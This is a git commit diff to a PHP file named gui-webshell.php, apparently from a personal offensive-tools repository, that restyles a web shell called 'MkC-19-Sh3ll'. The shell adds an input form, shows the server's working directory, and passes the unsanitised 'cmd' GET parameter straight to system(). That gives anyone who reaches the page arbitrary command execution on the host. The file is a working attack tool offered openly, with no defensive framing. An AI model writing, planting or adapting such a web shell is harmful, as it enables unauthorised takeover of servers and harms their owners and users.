98ea662c327d522e928b7e67861ddec39f0acf2e
Mickey_Cyberkid <63485016+mickey-cyberkid@users.noreply.github.com>
2022-11-02 06:31:23 +0000

    Update gui-webshell.php

--- gui-webshell.php
+++ gui-webshell.php
@@ -1,32 +1,43 @@
-<?php
-$cmd = $_GET['cmd'];
-echo '<!doctype HTML>
+<!doctype HTML>
   <head>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
       <title>MkC-19-Sh3ll</title>
       <style>
           body{color:black;
                background-color:rgb(74, 82, 60);
                font-family: 'Times New Roman', Times, serif;
                font-style: oblique;
+
             }
           h3{color:rgba( red, green, blue, alpha);
              background-attachment:scroll;
              background-color:forestgreen;
+             border-radius:6px;
           }
           .command-output{
               background-color: black;
               color:green;
               padding: 5px;
-              outline:5px solid #bbb;
-          }
 
+              outline:5px solid #bbb;
+         }
+         input{ border-radius:6px;
+              width :250px;
+              background-color:black;
+              color:green;
+        }
       </style>
     <body>
-     <h3>Command Output</h3>
-     <br/>
-     <h3>MkC-19 Sh3ll</h3>
-     <br/>
-     <textarea class="command-output" cols="91" rows="25" readonly="true" spellcheck="false" style="margin: 0px; height: 357px; width: 783px;">';
+       <h3>MkC-19 Sh3ll</h3>
+        <br/>
+       <form name"Command" action="<?php echo $_SERVER['PHP_SELF']; ?>" method="get">
+         <input type="text" name="cmd">
+       </form>
+      <?php $cwd = getcwd(); echo "<h3>[".$cwd."></h3>";?>
+
+     <textarea class="command-output" readonly="true" spellcheck="false" style="margin: 0px; height: 357px;" >
+<?php
+$cmd = $_GET['cmd'];
 system($cmd);
 echo '</textarea>';
 echo '</body></html>';
